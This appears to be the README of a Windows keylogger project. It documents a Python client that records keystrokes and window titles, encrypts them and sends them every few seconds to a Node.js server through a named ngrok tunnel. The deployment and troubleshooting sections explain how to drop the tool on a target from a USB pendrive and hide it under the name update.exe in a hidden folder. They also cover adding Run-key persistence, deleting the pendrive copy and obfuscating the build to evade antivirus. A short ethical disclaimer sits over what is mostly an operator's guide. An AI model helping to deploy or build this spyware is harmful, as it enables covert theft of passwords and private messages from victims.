# Stealthy Keylogger with Encrypted Exfiltration

**Overview:**  
Educational/red-team tool for Windows x64. Captures keystrokes, encrypts with Fernet (AES-128), exfiltrates via HTTPS to ngrok-tunneled server. Deploys from USB pendrive with persistence and stealth. Python client; Node.js server. <500KB PY, <10MB EXE.

**Ethical Note:** For security research/red-teaming only. Unauthorized deployment is illegal. Use in isolated VMs. Comply with laws.

## Prerequisites
- **Client:** Python 3.10+ (Windows). USB pendrive for sim.
- **Server:** Node.js 18+. ngrok account (static domain `sensible-gobbler-evenly.ngrok-free.app` configured).
- **Build:** PyInstaller (`pip install pyinstaller`). Optional: pyarmor (`pip install pyarmor`) for obfuscation.
- **Testing:** Windows 10/11 VM. Firewall off for local tests.

## Phase 1: Running Python Client
1. **Install Deps:** `cd client && pip install -r requirements.txt`
2. **Test Keygen/Encrypt:** `python test_keygen.py` (verifies crypto).
3. **Run Test Mode:** `python keylogger.py --test`  
   - Types keys; prints samples. ESC to stop. No deploy/persist.
4. **Full Run (Sim Deploy):** `python keylogger.py` (no --test).  
   - Generates `secret.key` if missing. Copies to `%APPDATA%\.syscache`, adds registry, relaunches.  
   - Check: `dir %APPDATA%\.syscache` (hidden files). `reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v SystemUpdate`.
5. **Server Setup:** See below. Run client with server up for exfil tests.
6. **Hotkey:** Ctrl+Alt+Shift+H toggles logging (state in `config.dat`).

## Phase 2: Building EXE
1. **Install PyInstaller:** `pip install pyinstaller`
2. **Build:** `cd build && build_exe.bat` (or `python build.py`).  
   - Outputs `dist/update.exe` (<10MB).  
   - Options: `--icon=icon.ico` for camouflage.  
   - Obfuscate: `pyarmor obfuscate keylogger.py` then build obfuscated.
3. **Test EXE:** Copy `update.exe` + `secret.key` to temp USB dir. Run. Verifies deploy (hidden copy, registry). Use VM.
4. **Adaptations:** Script uses `sys.executable` for EXE paths. No console (`--noconsole`).

## Deployment
1. **Prep USB:** Copy `update.exe` (built) to pendrive root.
2. **Deploy:** Insert pendrive on target, autorun or double-click `update.exe`.  
   - Generates/copies `secret.key` to hidden dir. Copies EXE. Adds startup. Relaunches hidden. Deletes pendrive copy (via bat).
3. **Retrieve Key:** Post-deploy, copy `secret.key` from pendrive (if not deleted) or regenerate matching.
4. **Exfil:** Logs send every 5s (retries offline). Hotkey toggle. Cleanup auto (24h max files).
5. **Disable:** Delete registry key or uninstall via taskmgr (process: update.exe).

## Running Server
1. **Setup:** `cd server && npm install`
2. **Copy Key:** Place `secret.key` in `/server`.
3. **Start:** `npm start` (port 3000).
4. **Tunnel:** `ngrok http 3000 --domain=sensible-gobbler-evenly.ngrok-free.app` (new terminal). Verify URL.
5. **API Key:** Set `API_KEY` in `server.js` to match client.
6. **Logs:** Decrypted batches in `./received logs` (JSON files w/ IP/timestamp).
7. **Test Endpoint:** `curl -X GET http://localhost:3000/status` → `{"status":"active"}`

## Troubleshooting
- **Key Mismatch:** Ensure same `secret.key` binary on client/server. Regenerate and copy.
- **No Exfil:** Check ngrok tunnel/firewall. Test POST w/ curl (use encrypted sample from `test_keygen.py`).
- **Permissions:** Run as admin for registry/hidden dirs. Pendrive write-protected? Use RW USB.
- **Retry Behaviors:** Offline: Saves to `pending.dat`, retries 20x (1s→5min), then 10min intervals. Clears on success.
- **PyInstaller Warnings:** Add `--hidden-import=pkg_resources` if needed. EXE antivirus? Obfuscate w/ pyarmor.
- **Window Titles Fail:** Install pygetwindow or fallback "Unknown".
- **Hotkey Miss:** Ensure left modifiers; exact combo.
- **File Retention:** Cleanup thread deletes >24h. No persistent logs otherwise (RAM-buffered).

## Technical Specs
- **Client Libs:** pynput (capture), cryptography.fernet (encrypt), requests (POST), winreg/ctypes (persist/hide), pygetwindow (titles).
- **Server Libs:** express, body-parser, fernet (decrypt), helmet (headers).
- **Log Format:** JSON array `[{"timestamp":"2025-10-27T12:00:00Z","window":"Notepad","keystrokes":"a"}]`.
- **Stealth:** Hidden dir/files/process (FreeConsole/--noconsole). Camo name "update.exe". RAM-first, no long-term files.
- **Constraints:** Lightweight. No advanced evasion (e.g., no injection).

For issues: Simulate in VM. Questions? Adapt code modularly.
